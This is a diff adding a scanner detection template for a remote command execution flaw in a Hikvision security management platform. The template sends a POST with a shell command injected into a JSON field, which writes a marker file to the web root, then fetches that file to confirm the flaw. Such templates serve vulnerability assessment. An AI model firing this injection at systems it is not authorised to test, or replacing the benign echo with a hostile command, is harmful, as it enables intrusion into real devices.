@@ -1,0 +1,21 @@
+name: HIKVISION-综合安防管理平台-detection-RCE
+description: >
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /center/api/installation/detection
+    headers:
+      Content-Type: application/json
+    body: |
+      {"type":"environment","operate":"","machines":{"id":  "$(echo 112233 > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/echo.txt)"}}
+    expression:
+      status: 200
+      body_all: ["code"]    
+  - method: GET
+    path: /vms/static/echo.txt
+    expression:
+      status: 200
+      body_all:
+        - "112233"
